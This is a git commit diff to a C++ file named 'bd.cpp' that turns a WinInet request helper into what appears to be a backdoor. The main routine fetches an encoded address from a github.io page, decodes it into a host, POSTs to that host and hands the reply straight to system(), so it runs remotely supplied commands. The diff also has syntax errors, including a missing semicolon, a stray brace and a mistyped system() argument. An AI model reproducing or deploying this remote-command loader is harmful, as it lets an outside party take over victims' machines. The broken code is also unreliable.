42b1efa00cfb967cc62bfe1f8e27a0864dad7122
ryu co <115430647+amagicman123456@users.noreply.github.com>
2025-02-11 07:23:44 -0800

    Update bd.cpp

--- bd.cpp
+++ bd.cpp
@@ -2,20 +2,20 @@
 #include <windows.h>
 #include <WinInet.h>
 #include <iostream>
-#include <sstream>
+#include <cstdlib>
 //link with -lwininet
-std::string send_request(const char* server, const char* page){
+std::string send_request(const char* server, const char* page, const char *verb = "GET", const char *payload = 0){
     std::string result;
     HINTERNET internet, connect, request;
     if(!(internet = InternetOpen("WinInet Test", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0)) ||
        !(connect = InternetConnect(internet, server, INTERNET_DEFAULT_HTTPS_PORT, 0, 0, INTERNET_SERVICE_HTTP, 0, 1)) ||
-       !(request = HttpOpenRequest(connect, "GET", page, 0, 0, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_SECURE, 1))) {
+       !(request = HttpOpenRequest(connect, verb, page, 0, 0, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_SECURE, 1))) {
         InternetCloseHandle(request);
         InternetCloseHandle(connect);
         InternetCloseHandle(internet);
         return "";
     }
-    bool s = HttpSendRequest(request, 0, 0, 0, 0);
+    bool s = HttpSendRequest(request, 0, 0, payload, 0);
     char data[10000];
     while(s) {
         DWORD bytes;
@@ -26,16 +26,20 @@ std::string send_request(const char* server, const char* page){
     }
     return result;
 }
+std::string ify(const std::string& s) {
+    std::string result;
+    int count = 0;
+    for (char c : s) {
+        result += c;
+        if (!(count++ % 3) && (count < s.length()))
+            result += '.';
+    }
+    }
+    return result;
+}
 int main(){
     std::string s = send_request("amagicman123456.github.io", "/bd/")
     for (char& i : s) i -= 97;
-    std::stringstream ss;
-    for (int i = 0, j = 0; i < s.length(); ++i) {
-        ss << s[i];
-        ss >> j;
-        if (j < 255) {
-
-        }
-    }
+    system(send_request(ify(s), "/", "POST", "ADSOFU1S"));
     return 0;
 }
